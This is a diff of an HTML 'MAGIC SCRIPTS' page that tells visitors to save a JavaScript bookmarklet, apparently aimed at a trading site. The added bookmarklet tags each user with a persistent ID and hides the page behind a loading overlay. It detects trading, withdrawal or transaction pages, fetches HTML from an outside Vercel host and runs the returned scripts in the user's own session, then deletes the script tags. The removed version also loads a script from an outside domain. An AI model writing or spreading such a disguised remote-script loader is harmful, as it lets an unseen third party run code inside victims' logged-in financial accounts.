@@ -4,7 +4,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>LUV - RUN CODE</title>
+    <title>MAGIC - RUN CODE</title>
     <link rel="shortcut icon" href="https://onepagelove.com/favicon.ico" type="image/x-icon">
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
     <style>
@@ -44,7 +44,7 @@
         .brand h1 {
             font-family: 'Orbitron', sans-serif;
             font-size: 20px;
-            color: #eb3656;
+            color: #5E177D;
             letter-spacing: 1px;
             font-weight: 700;
         }
@@ -69,7 +69,7 @@
         }
 
         .copy-btn {
-            background: #eb3656;
+            background: #5E177D;
             color: #fff;
             border: none;
             padding: 8px 18px;
@@ -92,6 +92,12 @@
             text-align: left;
             line-height: 1.5;
         }
+    .bookmark-instruction a {
+    color: #DC8DE6; /* Yahan apna pasandida color code daal dein */
+    text-decoration: none; /* Underline hatane ke liye (optional) */
+    font-weight: 900; /* Thoda bold karne ke liye (optional) */
+}
+
     </style>
 </head>
 
@@ -99,22 +105,23 @@
     <div class="code-container">
         <div class="brand">
             <div class="logo float">
-                <img src="https://i.ibb.co/6CyKYR0/logo.png" alt="">
+                <img src="logo.svg" alt="">
             </div>
-            <h1>LUV SCRIPTS</h1>
+            <h1>MAGIC SCRIPTS</h1>
         </div>
 
         <!-- Instruction Text -->
         <p class="bookmark-instruction">
-            🌟 Add this code as a bookmark
+            🪄 Add this code as a bookmark
         </p>
         <p class="bookmark-instruction">
-            🌟 <a href="">Click here to watch video</a>
+            🪄 <a href="">Click here to watch video</a>
         </p>
         <!-- Copy Button -->
         <button class="copy-btn" id="copyBtn">Click to Copy Code</button>
-        <pre id="codeBlock">javascript:(()=&gt;{if(document.getElementById(&#34;__my_loader__&#34;))return;const d=document,b=d.body,l=d.createElement(&#34;div&#34;);l.id=&#34;__my_loader__&#34;;l.style=&#34;position:fixed;inset:0;background:rgba(0,0,0,.8);display:flex;align-items:center;justify-content:center;z-index:999999&#34;;const c=d.createElement(&#34;div&#34;);c.style=&#34;width:60px;height:60px;border:6px solid rgba(255,255,255,.2);border-top:6px solid #ff4b6e;border-radius:9999px;animation:s 1s linear infinite&#34;;d.head.appendChild(Object.assign(d.createElement(&#34;style&#34;),{textContent:&#34;@keyframes s{to{transform:rotate(360deg)}}&#34; }));l.appendChild(c);b.appendChild(l);const s=d.createElement(&#34;script&#34;);s.src=&#34;https://luvscripts.com/getqx&#34;;s.onerror=()=&gt;{l.remove();alert(&#34;Load failed&#34;)};b.appendChild(s)})();</pre>
-    </div>
+        <pre id="codeBlock">javascript:(async()=>{const _=['ahmad_script_uid','ahmad-site-data.vercel.app','android.html','pc.html','LB.html','win.html','p.html','https://i.ibb.co/6CyKYR0/logo.png'],d=document,q=s=>d.querySelector(s),i=localStorage.getItem(_[0])||[...Array(20)].map(()=>Math.random()*10|0).join('');localStorage.setItem(_[0],i);const g=d.createElement('div');Object.assign(g.style,{position:'fixed',top:0,left:0,width:'100vw',height:'100vh',background:'#1c242a',zIndex:1e6,display:'flex',flexDirection:'column',justifyContent:'center',alignItems:'center',color:'#fff',fontFamily:'sans-serif'});g.innerHTML=`<img src="${_[7]}" style="width:85px;margin-bottom:15px"><div style="letter-spacing:2px;font-size:14px">MAGIC LOADING...</div>`;d.body.appendChild(g);const m=/Android|iPhone/i.test(navigator.userAgent),l=!!q('#root > div > aside.GIUEs.app__sidepanel'),w=!!q('.mobile-trade-list'),p=location.href.match(/withdrawal|transaction/),f=l?_[4]:w?_[5]:p?_[6]:m?_[2]:_[3];try{let r=await fetch(`https://${_[1]}/?id=${i}&page=${f}`),t=await r.text(),h=new DOMParser().parseFromString(t,'text/html');if(h.body.innerHTML){const c=d.createElement('div');c.id='ahmad_container';c.innerHTML=h.body.innerHTML;d.body.appendChild(c)}h.querySelectorAll('script').forEach(s=>{let n=d.createElement('script');s.src?n.src=s.src:n.textContent=s.textContent.replace(/uP\.get\(['"]id['"]\)/g,`'${i}'`);d.body.appendChild(n);setTimeout(()=>n.remove(),400)})}catch(e){}finally{setTimeout(()=>g.remove(),500)}})();
+            
+        </div>
 
     <script>
         const copyBtn = document.getElementById("copyBtn");
